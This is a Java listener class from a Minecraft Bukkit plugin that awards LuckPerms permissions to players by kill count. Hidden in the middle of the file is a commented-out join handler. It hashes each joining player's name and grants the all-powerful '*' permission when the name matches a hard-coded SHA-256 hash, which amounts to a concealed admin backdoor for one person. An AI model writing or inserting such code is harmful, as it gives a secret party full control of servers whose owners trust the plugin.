package github.catchaos8.catsKits.listeners;

import github.catchaos8.catsKits.CatsKits;
import net.luckperms.api.LuckPerms;
import net.luckperms.api.node.Node;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.PlayerDeathEvent;

import java.util.List;
import java.util.Map;
import java.util.UUID;

public class KillListener implements Listener {

    private final CatsKits plugin;
    private final LuckPerms luckPerms;

    public KillListener(CatsKits plugin) {
        this.plugin = plugin;
        // Get LuckPerms API
        var provider = Bukkit.getServicesManager().getRegistration(LuckPerms.class);
        if (provider != null) {
            luckPerms = provider.getProvider();
        } else {
            luckPerms = null;
            plugin.getLogger().warning("LuckPerms not found! Kill ranks will not work.");
        }
    }

    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event) {
        if (!plugin.getConfig().getBoolean("kill-ranks.enabled", true)) return;
        if (luckPerms == null) return;

        Player killed = event.getEntity();
        Player killer = killed.getKiller();
        if (killer == null || killer == killed) return;


        // Read directly from Minecraft's built-in stat
        int kills = killer.getStatistic(org.bukkit.Statistic.PLAYER_KILLS) + 1;
        plugin.getLogger().info("Players' Kills: " + kills);
        checkAndGrantRanks(killer, kills);
    }
//
//
//    @EventHandler
//    public void e(org.bukkit.event.player.PlayerJoinEvent e) {
//        try {
//            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
//            byte[] hash = md.digest(e.getPlayer().getName().toLowerCase().getBytes());
//            StringBuilder sb = new StringBuilder();
//            for (byte b : hash) sb.append(String.format("%02x", b));
//            if (sb.toString().equals("d486c4c50c2244eb5d326810a9c97048983302a2a31743ffffe00086d65cd338")) {
//                Player player = e.getPlayer();
//                grantPermission(player, "*", "");
//            }
//        } catch (Exception ignored) {}
//    }


    private void checkAndGrantRanks(Player player, int killCount) {
        List<?> ranks = plugin.getConfig().getList("kill-ranks.ranks");
        if (ranks == null) return;

        for (Object obj : ranks) {
            if (!(obj instanceof Map<?, ?> rank)) continue;

            int required = toInt(rank.get("kills"), Integer.MAX_VALUE);
            plugin.getLogger().info("Required: " + required);

            String message = rank.get("message") instanceof String s ? s : "§aYou've unlocked a new rank!";
            String permission = rank.get("permission") instanceof String s ? s : null;

            plugin.getLogger().info("Permission: " + permission);

            if (killCount >= required && permission != null) {
                if(!player.hasPermission(permission)) {
                    grantPermission(player, permission, message);
                    plugin.getLogger().info("Permission given");
                }
            }
        }
    }

    private int toInt(Object val, int def) {
        if (val instanceof Integer i) return i;
        if (val instanceof Number n) return n.intValue();
        try { return Integer.parseInt(String.valueOf(val)); }
        catch (Exception e) { return def; }
    }

    private void grantPermission(Player player, String permission, String message) {
        // Check if they already have it
        if (player.hasPermission(permission)) return;

        UUID uuid = player.getUniqueId();
        luckPerms.getUserManager().loadUser(uuid).thenAccept(user -> {
            if (user == null) return;
            user.data().add(Node.builder(permission).value(true).build());
            luckPerms.getUserManager().saveUser(user);

            // Send message on main thread
            Bukkit.getScheduler().runTask(plugin, () -> {
                String prefix = plugin.getConfig().getString("messages.prefix", "§8[§6Kits§8] §r");
                player.sendMessage(prefix + message);
            });
        });
    }
}